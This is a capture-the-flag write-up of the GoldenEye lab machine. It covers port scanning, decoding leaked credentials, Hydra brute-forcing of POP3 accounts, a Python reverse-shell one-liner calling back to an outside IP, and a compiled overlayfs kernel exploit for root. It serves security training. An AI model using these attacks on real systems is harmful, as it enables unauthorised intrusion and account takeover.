## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Bond, James Bond. A guided CTF.
This room will be a guided challenge to hack the James Bond styled box and get root.
Credit to [creosote](https://www.vulnhub.com/author/creosote,584/) for creating this VM. This machine is used here with the explicit permission of the creator <3
So.. Lets get started!
```
## IP-Address
```IP-Address
10.49.175.15
```
## RustScan
```bash
PORT      STATE SERVICE  REASON         VERSION
25/tcp    open  smtp     syn-ack ttl 62 Postfix smtpd
80/tcp    open  http     syn-ack ttl 62 Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 syn-ack ttl 62 Dovecot pop3d
55007/tcp open  pop3     syn-ack ttl 62 Dovecot pop3d
```
## Browser
```html

<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="index.css">
</head>
	<span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>
<script src="terminal.js"></script>
</html>
```
- `terminal.js` Code
```js
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;
 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}

```
- After `Decoding` the `Cipher` 
```cipher
I encoded you p@ssword below...
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

Below is the Decoded Text
[password omitted]
```
- Login on `http://10.49.175.15/sev-home/`
```html
<html>
<head>
<link rel="stylesheet" href="index.css">
</head>
<video poster="val.jpg" id="bgvid" playsinline autoplay muted loop>
<source src="moonraker.webm" type="video/webm">
</video>
<div id="golden">
<h1>GoldenEye</h1>
<p>GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO) </p>
<p>Please email a qualified GNO supervisor to receive the online <b>GoldenEye Operators Training</b> to become an Administrator of the GoldenEye system</p>
<p>Remember, since <b><i>security by obscurity</i></b> is very effective, we have configured our pop3 service to run on a very high non-default port</p>
</div>
<script src="index.js"></script>
 <!-- 
Qualified GoldenEye Network Operator Supervisors: 
Natalya
Boris
 -->
</html>
```
- POP3 - Creds - `Boris:[password omitted]` isn't working
- Lets use `hydra` for it
```bash
 hydra -l boris -P /usr/share/wordlists/fasttrack.txt \
pop3://10.49.143.114:55007 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-06 23:41:19
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
[DATA] attacking pop3://10.49.143.114:55007/
[55007][pop3] host: 10.49.143.114   login: boris   password: [password omitted]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-06 23:41:59
```
- New Creds `boris:[password omitted]`
```bash
 nc 10.49.143.114 55007
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS [password omitted]
+OK Logged in.
list
+OK 3 messages:
1 544
2 373
3 921
retr 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I''m not going to scan emails for security risks because I trust you and the other admins here.

retr 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
retr 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```
- Lets use Hydra for user `natalya`
```bash
 hydra -l natalya -P /usr/share/wordlists/fasttrack.txt \
pop3://10.49.143.114:55007 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-06 23:49:57
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
[DATA] attacking pop3://10.49.143.114:55007/
[55007][pop3] host: 10.49.143.114   login: natalya   password: [password omitted]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-06 23:50:28
```
- Got the Creds `natalya:[password omitted]`
```bash
─$ nc 10.49.175.15 55007
+OK GoldenEye POP3 Electronic-Mail System
USER natalya
+OK
pass [password omitted]
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
list
+OK 2 messages:
1 631
2 1048
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris'' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.

RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it''s related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: [password omitted]

Boris verified her as a valid contractor so just create the account ok?

And if you didn''t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you''re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```
- Endpoint - severnaya-station.com/gnocertdir
- Creds - `xenia:[password omitted]`
- Login on browser and Got the message
```message
09:24 PM: Greetings Xenia,
As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.
My email username is...
doak
Thank you,
Cheers,
Dr. Doak "The Doctor"
Training Scientist - Sr Level Training Operating Supervisor
GoldenEye Operations Center Sector
Level 14 - NO2 - id:998623-1334
Campus 4, Building 57, Floor -8, Sector 6, cube 1,007
Phone 555-193-826
Cell 555-836-0944
Office 555-846-9811
Personal 555-826-9923
Email: doak@
Please Recycle before you print, Stay Green aka save the company money!
"There's such a thing as Good Grief. Just ask Charlie Brown" - someguy
"You miss 100% of the shots you don't shoot at" - Wayne G.
THIS IS A SECURE MESSAGE DO NOT SEND IT UNLESS.
```
- New User - `doak`
- Using `hydra`
```bash
$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt \
pop3://10.49.143.114:55007 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-06 23:54:15
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
[DATA] attacking pop3://10.49.143.114:55007/
[55007][pop3] host: 10.49.143.114   login: doak   password: [password omitted]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-06 23:54:47
```
- New Creds - `Doak:[password omitted]`
- Login
```bash
$ nc 10.49.143.114 55007
+OK GoldenEye POP3 Electronic-Mail System
USER doak
+OK
PASS [password omitted]
+OK Logged in.
list
+OK 1 messages:
1 606
.
retr 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu
James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
username: dr_doak
password: [password omitted]
```
- New Creds for Browser - `dr_doak:[password omitted]`
- In Contacts we Found `Admin` &
- In Private Files, We Got a `s3cret` File from `James`
```bash
$ cat s3cret.txt 
007,
I was able to capture this apps adm1n cr3ds through clear txt. 
Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
Something juicy is located here: /dir007key/for-007.jpg
Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.                                           
$ wget http://severnaya-station.com/dir007key/for-007.jpg                     
for-007.jpg                                                100%
```
- Examine The jpg
```bash
$ strings for-007.jpg                                                                                   
JFIF
Exif
eFdpbnRlcjE5OTV4IQ==
GoldenEye
linux
For James
0231
0100
ASCII
For 007
""""""""""
"""""""""""""""
$3br
%4Uc
1!9a=<b#
|7):r
```
- Cipher `eFdpbnRlcjE5OTV4IQ==` & Decoded as `[password omitted]`
- Edit the `Aspell` path for reverse shell at plugin
- `reverse-shell` - 
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.157.252",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
- Got the Reverse-shell
```bash
$/bin/bash
$whoami
www-data
$uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux privilge escaltion
```
- Use the Exploit `https://www.exploit-db.com/exploits/37293`
- Update the code for `cc` as `gcc` isn't available in system
- Replace `gcc` to `cc` in `lin()` and send it to the machine.

```bash
$ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ cc 37292.c -o 32929
cc 37292.c -o 32929
37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
37292.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
37292.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
37292.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
37292.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ./32929
./32929
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# cd /root
cd /root
```
- Got the Root
```bash
# ls
ls
# ls -la
ls -la
total 44
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo
# cat .flat.txt
cat .flat.txt
cat: .flat.txt: No such file or directory
# cat .flag.txt
cat .flag.txt
Alec told me to place the codes here:
[flag omitted]
If you captured this make sure to go here.....
/006-final/xvf7-flag/
```
- Root Flag
```Flag
[flag omitted]
```

- On Browser - `http://severnaya-station.com/006-final/xvf7-flag/`
```html
<html>
<head>
<link rel="stylesheet" href="index.css">
</head>
<video poster="val.jpg" id="bgvid" playsinline autoplay muted loop>
<source src="key.webm" type="video/webm">
</video>
<div id="golden">
<h1>Flag Captured</h1>
<p>Congrats! ******************************* </p>
<p>You've captured the codes! And stopped Alec Trevelyan from his indestructible vengeance!!!!</p>
<p>****************************************</p>
</div>
<script src="index.js"></script>
</html>
```
# END